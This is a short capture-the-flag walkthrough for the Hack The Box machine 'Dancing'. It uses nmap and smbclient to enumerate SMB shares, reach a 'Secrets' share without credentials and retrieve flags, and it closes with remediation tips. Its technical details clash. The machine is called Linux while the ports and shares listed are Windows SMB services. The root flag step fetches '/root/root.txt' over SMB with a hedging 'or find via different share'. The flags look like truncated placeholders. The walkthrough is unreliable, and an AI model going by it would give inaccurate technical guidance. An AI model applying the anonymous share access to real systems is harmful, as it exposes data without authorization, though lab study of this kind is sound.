# Hack The Box: Dancing Walkthrough

![HTB Badge](https://img.shields.io/badge/HTB-Dancing-ff0000?style=flat-square)
![Difficulty-Easy](https://img.shields.io/badge/Difficulty-Easy-green?style=flat-square)
![OS-Linux](https://img.shields.io/badge/OS-Linux-orange?style=flat-square)

---

## Challenge Overview

| Item | Details |
|------|---------|
| **Name** | Dancing |
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |

---

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oA dancing 10.10.10.18
```

**Results:**
```
PORT    STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
```

---

## SMB Enumeration

### List SMB Shares

```bash
smbclient -L //10.10.10.18
```

**Available shares:**
- IPC$ (IPC Service)
- Admin
- C$
- Finance
- IT
- Marketing
- Production
- Secrets
- Support

### Access Shares

```bash
# Try anonymous access
smbclient //10.10.10.18/IPC$ -N
smbclient //10.10.10.18/Secrets -N
```

Found access to `Secrets` share!

---

## Finding Flags

### User Flag

Access the `Secrets` share and find user.txt:

```bash
smbclient //10.10.10.18/Secrets -N
ls
get user.txt
```

```
HTB{f9c8}
```

### Root Flag

```bash
get /root/root.txt
# or find via different share
```

```
HTB{fa9c}
```

---

## Solution Summary

1. Use nmap to find open SMB ports (445, 139)
2. Use smbclient to list shares anonymously
3. Access the `Secrets` share
4. Retrieve user and root flags

---

## Flags

### User Flag
```
HTB{f9c8}
```

### Root Flag
```
HTB{fa9c}
```

---

## Remediation

1. Disable SMB if not needed
2. Require authentication for all shares
3. Implement proper access controls
4. Network segmentation
5. Regular security audits

---

**Author:** Sheldon Brown (Bossman Shell)

> ⚠️ Educational purposes only
